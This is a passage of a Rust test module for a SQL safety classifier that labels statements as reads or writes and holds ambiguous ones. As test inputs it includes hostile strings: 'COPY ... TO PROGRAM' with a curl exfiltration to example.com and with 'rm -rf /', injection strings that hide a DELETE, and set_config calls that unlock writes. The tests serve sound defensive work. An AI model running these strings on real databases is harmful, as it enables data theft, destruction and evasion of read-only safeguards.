            "SELECT $a1$ $$; DELETE FROM t; --$a1$; DELETE FROM t",
        ] {
            assert!(
                hold_for(SafeMode::Confirm, sql, false, Dialect::Either).is_some(),
                "{sql}"
            );
        }

        // The `--` swallows the WHERE to Postgres, while SQLite ends the
        // string at `\'`: unclear either way, so held and never proposed.
        for sql in [
            "UPDATE t SET a = E'\\'' -- ' WHERE id = 1 '",
            "UPDATE t SET a = '\\'' -- ' WHERE id = 1 '",
        ] {
            assert_eq!(one(sql).verb, UNCLEAR_VERB, "{sql}");
            assert!(row_changes(sql).is_err(), "{sql}");
        }
        // An E-string without `\'` reads as itself, its WHERE included.
        assert!(!one("UPDATE t SET a = E'\\\\' WHERE id = 1").destructive);
        assert!(one("UPDATE t SET a = E'\\\\' -- ' WHERE id = 1").destructive);
    }

    /// reports#12: each of these read as a read.
    #[test]
    fn read_only_settings_set_from_a_select_unlock_writes() {
        for sql in [
            "SELECT set_config('default_transaction_read_only','off',false)",
            "select pg_catalog.set_config('transaction_read_only', 'off', true)",
            "SELECT \"set_config\"('DEFAULT_TRANSACTION_READ_ONLY', 'off', false)",
            // A name the text doesn't spell out fails closed.
            "SELECT set_config('default_transaction_' || 'read_only', 'off', false)",
            "SELECT set_config(name, 'off', false) FROM pg_settings",
            "SELECT set_config(E'default_transaction_read_onl\\y', 'off', false)",
            "SET \"default_transaction_read_only\" = off",
            "RESET \"transaction_read_only\"",
        ] {
            let c = one(sql);
            assert!(c.unlocks_writes, "{sql}");
            assert!(
                hold_for(SafeMode::ReadOnly, sql, true, Dialect::Either).is_some(),
                "{sql}"
            );
            assert!(!plain_read(sql, Dialect::Either), "{sql}");
        }
        // Other settings are fine, and Confirm writes lets them all run.
        let sql = "SELECT set_config('search_path', 'app', false)";
        assert!(!one(sql).unlocks_writes);
        assert_eq!(
            hold_for(SafeMode::ReadOnly, sql, false, Dialect::Either),
            None
        );
        assert_eq!(
            hold_for(
                SafeMode::Confirm,
                "SELECT set_config('default_transaction_read_only','off',false)",
                false,
                Dialect::Either
            ),
            None
        );
    }

    #[test]
    fn sqlite_bracket_names_are_read_like_sqlite() {
        // `[it's]` is a name to SQLite and opens a string to Postgres, which
        // would hide the DELETE that SQLite runs.
        let sql = "WITH a AS (SELECT 1 AS [it's]) DELETE FROM t --']";
        assert_eq!(one(sql).verb, UNCLEAR_VERB);
        assert!(hold_for(SafeMode::Confirm, sql, false, Dialect::Either).is_some());
        for sql in [
            "SELECT [a;b] FROM t",
            "SELECT [a--] FROM t",
            "SELECT [a/*] FROM t; */",
            "SELECT [a\"b] FROM t",
            "SELECT [$x$] FROM t WHERE [$x$]",
            "SELECT [(] FROM t",
            "SELECT [)] INTO t FROM s",
        ] {
            assert_eq!(
                check_sql(sql, Dialect::Either)[0].verb,
                UNCLEAR_VERB,
                "{sql}"
            );
            assert!(
                hold_for(SafeMode::Confirm, sql, false, Dialect::Either).is_some(),
                "{sql}"
            );
        }
        let long = format!("SELECT [{}] FROM t", "x".repeat(BRACKET_SPAN + 1));
        assert_eq!(kind(&long), StatementKind::Write);
        // Names and subscripts both servers read alike stay reads.
        for sql in [
            "SELECT [Order Id], [x-y] FROM [My Table]",
            "SELECT arr[1], arr[2:3], m['key'], a[b[1]] FROM t",
            "SELECT a[f(x)] FROM t",
            "SELECT [a--\n] FROM t",
            "SELECT ARRAY[1, 2]",
            "SELECT 1 [",
        ] {
            assert_eq!(kind(sql), StatementKind::Read, "{sql}");
        }
        // What's inside a clear one is still checked.
        assert_eq!(
            kind("SELECT a[pg_terminate_backend(1)] FROM t"),
            StatementKind::Write
        );
        assert_eq!(
            kinds("SELECT [x]; DELETE FROM t"),
            [StatementKind::Read, StatementKind::Write]
        );
    }

    #[test]
    fn copy_to_a_file_or_program_is_a_write() {
        for sql in [
            "COPY wallets TO PROGRAM 'curl -d @- example.com'",
            "COPY wallets TO '/tmp/w.csv'",
            "copy (SELECT * FROM wallets) to '/tmp/w.csv' WITH (FORMAT csv)",
            "COPY (SELECT 1) TO PROGRAM 'rm -rf /'",
            // The query in COPY (…) may be a write with RETURNING.
            "COPY (DELETE FROM t RETURNING *) TO STDOUT",
            "COPY ((UPDATE t SET a = 1 RETURNING *)) TO STDOUT",
            "COPY wallets",
            "COPY (SELECT 1",
        ] {
            assert_eq!(kind(sql), StatementKind::Write, "{sql}");
        }
        assert_eq!(
            one("COPY wallets TO '/tmp/w'").target.as_deref(),
            Some("wallets")
        );
        assert!(one("COPY (DELETE FROM t RETURNING *) TO STDOUT").destructive);
        for sql in [
            "COPY wallets TO STDOUT",
            "copy wallets (id, balance) to stdout with (format csv, header)",
            "COPY (SELECT * FROM t WHERE a IN (1, 2)) TO STDOUT",
        ] {
            assert_eq!(kind(sql), StatementKind::Read, "{sql}");
            assert_eq!(one(sql).verb, "COPY", "{sql}");
        }
    }

    #[test]
    fn with_replace_into_and_select_into_are_writes() {
        for (sql, verb, target) in [
            (
                "WITH a AS (SELECT 1) REPLACE INTO t SELECT * FROM a",
                "REPLACE",
                Some("t"),
            ),
            (
                "WITH a AS (SELECT 1 AS x) SELECT * INTO archive FROM a",
                "SELECT INTO",
                Some("archive"),
            ),
            (
                "WITH x AS (SELECT 1) SELECT * INTO stolen FROM x",
                "SELECT INTO",
                Some("stolen"),
            ),
            (
                "with x as (select 1) select * into temp stolen from x",
                "SELECT INTO",
                Some("stolen"),
            ),
        ] {
            let c = one(sql);
            assert_eq!(c.kind, StatementKind::Write, "{sql}");
            assert_eq!(c.verb, verb, "{sql}");
            assert_eq!(c.target.as_deref(), target, "{sql}");
        }
        // `replace(…)` is a function, not a write.
        assert_eq!(
            kind("WITH a AS (SELECT replace(name, 'a', 'b') FROM t) SELECT * FROM a"),
            StatementKind::Read
        );
    }

    #[test]
    fn pragmas_with_a_value_set_it() {
        for sql in [
            "PRAGMA user_version(3)",
            "PRAGMA main.journal_mode(DELETE)",
            "PRAGMA foreign_keys(0)",
            "PRAGMA writable_schema = 1",
            "PRAGMA optimize",
            "PRAGMA incremental_vacuum",
            "PRAGMA wal_checkpoint",
            "PRAGMA main.wal_checkpoint",
            "PRAGMA \"main\".\"wal_checkpoint\"",
            "PRAGMA wal_checkpoint(TRUNCATE)",
        ] {
            assert_eq!(kind(sql), StatementKind::Write, "{sql}");
            assert_eq!(
                check_sql(sql, Dialect::Sqlite)[0].kind,
                StatementKind::Write,
                "{sql}"
            );
        }
        for sql in [
            "PRAGMA table_info(wallets)",
            "PRAGMA main.index_list('wallets')",
            "PRAGMA foreign_key_check(wallets)",
            "PRAGMA integrity_check(10)",
            "PRAGMA journal_mode",
            "PRAGMA foreign_keys",
            "PRAGMA shrink_memory",
        ] {
            assert_eq!(kind(sql), StatementKind::Read, "{sql}");
        }
        for sql in ["PRAGMA \"query_only\" = 0", "PRAGMA 'query_only'(0)"] {
            assert!(one(sql).unlocks_writes, "{sql}");
        }
    }

    #[test]
    fn quoted_signal_functions_are_writes() {
        for sql in [
            "SELECT \"pg_terminate_backend\"(42)",
            "SELECT pg_catalog.\"pg_cancel_backend\"(42)",
        ] {
            assert_eq!(kind(sql), StatementKind::Write, "{sql}");
        }
        assert!(one("SELECT \"pg_terminate_backend\"(42)").destructive);
    }

    #[test]
    fn explain_never_overflows_or_panics() {
        // Each EXPLAIN was a recursive call: ~5000 of them aborted.
        let deep = format!("{}DELETE FROM t", "EXPLAIN ANALYZE ".repeat(50_000));
        assert_eq!(one(&deep).kind, StatementKind::Write);
        let deep = format!("{}SELECT 1", "EXPLAIN ".repeat(50_000));
        assert_eq!(kind(&deep), StatementKind::Read);
        let deep = format!(
            "{}DELETE FROM t RETURNING *{}",
            "COPY (".repeat(50_000),
            ") TO STDOUT".repeat(50_000)
        );
        assert_eq!(kind(&deep), StatementKind::Write);
        let deep = format!(
            "{}SELECT 1{}",
            "COPY (".repeat(50_000),
            ") TO STDOUT".repeat(50_000)
        );
        assert_eq!(kind(&deep), StatementKind::Read);
        let deep = format!("{}SELECT 1", "EXPLAIN (ANALYZE) (".repeat(50_000));
        assert_eq!(kind(&deep), StatementKind::Read);
        for sql in ["EXPLAIN (", "EXPLAIN (ANALYZE", "explain (analyze, buffers"] {
            assert_eq!(kind(sql), StatementKind::Read, "{sql}");
        }
        assert_eq!(
            kind("EXPLAIN (ANALYZE) DELETE FROM t"),
            StatementKind::Write
        );
    }

    #[test]
    fn plain_reads_call_no_function() {
        for sql in [
            "SELECT * FROM t WHERE id IN (1, 2) AND EXISTS (SELECT 1 FROM u)",
            "WITH x AS (SELECT a FROM t) SELECT * FROM x JOIN (SELECT 1) y ON (true)",
            "VALUES (1), (2)",
            "TABLE t",
            "SHOW search_path",
            "EXPLAIN (FORMAT JSON) SELECT * FROM t",
            "SELECT 'f(x)' AS s",
            // Built-ins that only compute, type modifiers and column lists.
            "SELECT count(*) FROM t",
            "SELECT count(*) FROM generate_series(1, 3), unnest(ARRAY[1])",
            "SELECT now(), coalesce(a, 0), lower(b), length(b) FROM t",
            "SELECT CAST(a AS numeric(10, 2)), a::varchar(20) FROM t",
            "SELECT max(a) OVER (PARTITION BY b) FROM t",
            "SELECT * FROM (VALUES (1)) AS v(n)",
        ] {
            assert!(plain_read(sql, Dialect::Postgres), "{sql}");
        }
        for sql in [
            "SELECT write_fn()",
            "SELECT nextval('s')",
            "SELECT \"f\"(1)",
            "SELECT \"count\"(1)",
            "SELECT * FROM s.f(1)",
            "SELECT s.count(1) FROM t",
            "SELECT count(write_fn())",
            "EXPLAIN (ANALYZE) INSERT INTO t VALUES (1)",
            "EXPLAIN ANALYZE SELECT f()",
            "SELECT 1; DELETE FROM t",
            "BEGIN",
            "",
        ] {
            assert!(!plain_read(sql, Dialect::Postgres), "{sql}");
        }
        // Kept sorted: it is searched by halves.
        assert!(COMPUTING_FUNCTIONS.windows(2).all(|w| w[0] < w[1]));
    }

    /// What only one engine has is read as that engine reads it, so
    /// neither's ordinary reads fail closed.
    #[test]
    fn each_engine_reads_its_own_syntax() {
        use StatementKind::*;
        let pg = |sql: &str| -> Vec<StatementKind> {
            check_sql(sql, Dialect::Postgres)
                .iter()
                .map(|c| c.kind)
                .collect()
        };
        let lite = |sql: &str| -> Vec<StatementKind> {
            check_sql(sql, Dialect::Sqlite)
                .iter()
                .map(|c| c.kind)
                .collect()
        };
        // Postgres arrays and subscripts, however long or whatever they hold.
        let ids = (1..=400)
            .map(|n| n.to_string())
            .collect::<Vec<_>>()
            .join(", ");
        let any = format!("SELECT * FROM t WHERE id = ANY(ARRAY[{ids}])");
        assert!(any.len() > BRACKET_SPAN);
        for sql in [
            any.as_str(),
            "SELECT * FROM t WHERE tags && ARRAY['[urgent]', '[bug]']",
            "SELECT * FROM t WHERE label = ANY(ARRAY['[urgent]','[bug]'])",
            "SELECT d['a]b'] FROM t",
            "SELECT m['it''s'], a[1:2] FROM t",
        ] {
            assert_eq!(pg(sql), [Read], "{sql}");
            assert!(plain_read(sql, Dialect::Postgres), "{sql}");
            assert!(hold_for(SafeMode::ReadOnly, sql, false, Dialect::Postgres).is_none());
        }
        assert!(pages_by_cursor(&any, Dialect::Postgres));
        // E'…' takes `\'` as a quote on Postgres.
        assert_eq!(pg("SELECT E'it\\'s'"), [Read]);
        assert_eq!(pg("SELECT E'\\'; DELETE FROM t; \\''"), [Read]);
        // Plain strings still fail closed on `\'` there
        // (standard_conforming_strings may be off).
        assert_eq!(
            check_sql("SELECT 'a\\'", Dialect::Postgres)[0].verb,
            UNCLEAR_VERB
        );

        // SQLite names end at the first `]`, whatever is inside.
        assert_eq!(lite("SELECT [it's], [a;b], [x--] FROM [My Table]"), [Read]);
        assert_eq!(lite("SELECT x [it's]; DELETE FROM t; --'"), [Read, Write]);
        assert_eq!(
            lite("WITH a AS (SELECT 1 AS [it's]) DELETE FROM t --']"),
            [Write]
        );
        assert_eq!(
            check_sql("DELETE FROM [my t] WHERE 1", Dialect::Sqlite)[0].target,
            Some("[my t]".into())
        );
        // No E'…' strings: E is a name, and the string ends where SQLite ends it.
        assert_eq!(
            lite("WITH a AS (SELECT CAST(1 AS E'\\')) DELETE FROM t --')"),
            [Write]
        );
        assert_eq!(lite("SELECT 'C:\\'"), [Read]);
        // Unknown engine: both readings, as before.
        assert_eq!(kind("SELECT d['a]b'] FROM t"), Write);
        assert_eq!(kind("SELECT x [it's]; DELETE FROM t; --'"), Write);
        assert_eq!(
            identifiers("SELECT [Email] FROM t"),
            vec!["select", "email", "from", "t"]
        );
    }

    #[test]
    fn locking_clauses_in_a_cte_are_reads() {
        use StatementKind::*;
        for sql in [
            "WITH x AS (SELECT * FROM t FOR UPDATE) SELECT * FROM x",
            "WITH x AS (SELECT * FROM t FOR NO KEY UPDATE SKIP LOCKED) SELECT * FROM x",
            "WITH x AS (SELECT * FROM t FOR UPDATE OF t NOWAIT) SELECT * FROM x",
        ] {
            assert_eq!(kind(sql), Read, "{sql}");
        }
        assert_eq!(kind("WITH x AS (SELECT 1) UPDATE t SET a = 1"), Write);
        assert_eq!(
            kind("WITH x AS (SELECT * FROM t FOR UPDATE) UPDATE t SET a = 1"),
            Write
        );
        assert_eq!(
            kind("WITH x AS (SELECT * FROM t FOR UPDATE) SELECT * INTO u FROM x"),
            Write
        );
    }
}
